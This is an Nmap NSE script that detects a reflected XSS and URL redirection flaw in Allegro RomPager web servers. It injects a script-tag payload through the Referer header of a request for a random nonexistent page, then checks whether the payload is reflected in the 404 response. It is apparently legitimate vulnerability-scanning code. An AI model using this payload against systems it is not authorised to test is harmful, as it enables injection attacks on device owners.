description = [[
URL redirection and reflected XSS vulnerability in Allegro RomPager Web server
]]

---
-- @usage nmap -p80 --script http-rompager-xss <target>
-- @usage nmap -sV http-rompager-xss <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-rompager-xss: 
-- |   VULNERABLE:
-- |   URL redirection and reflected XSS vulnerability in Allegro RomPager Web server
-- |     State: VULNERABLE (Exploitable)
-- |        
-- |       Devices based on Allegro RomPager web server are vulnerable to URL redirection and reflected XSS. 
-- |       If Referer header in a request to a non existing page, data can be injected into the resulting 404 page. 
-- |       This includes linking to an untrusted website and XSS injection. 
-- |     Disclosure date: 2013-07-1
-- |     References:
-- |_      https://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf
---

author = "Vlatko Kosturjak <kost@linux.hr>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"

portrule = shortport.http

---Generates a random string of the requested length. This can be used to check how hosts react to
-- weird username/password combinations. (taken from oracle-enum-users -kost)
--@param length (optional) The length of the string to return. Default: 8.
--@param set    (optional) The set of letters to choose from. Default: upper, lower, numbers, and underscore.
--@return The random string.
local function get_random_string(length, set)
  if(length == nil) then
    length = 8
  end

  if(set == nil) then
    set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"
  end

  local str = ""

  for i = 1, length, 1 do
    local random = math.random(#set)
    str = str .. string.sub(set, random, random)
  end

  return str
end

action = function(host, port)
  local vuln = {
    title = 'URL redirection and reflected XSS vulnerability in Allegro RomPager Web server',
    state = vulns.STATE.NOT_VULN,
    description = [[ 
Devices based on Allegro RomPager web server are vulnerable to URL redirection and reflected XSS. 
If Referer header in a request to a non existing page, data can be injected into the resulting 404 page. 
This includes linking to an untrusted website and XSS injection. ]],
    references = {
      'https://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf',
    },
    dates = {
      disclosure = {year = '2013', month = '07', day = '1'},
    },
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local header = { ["Referer"] = '"><script>alert("XSS")</script><"' }
  local open_session = http.get(host.ip, port, "/"..get_random_string(16), { header = header })
  if open_session and open_session.status == 404 then
    stdnse.debug2("got 404-that's good!")
    if open_session.body:match('"><script>alert%("XSS"%)</script><"') then
        vuln.state = vulns.STATE.EXPLOIT
	-- vuln.extra_info = open_session.body
	stdnse.debug1("VULNERABLE. Router answered correctly!")
        return vuln_report:make_output(vuln)
    end
  end
end
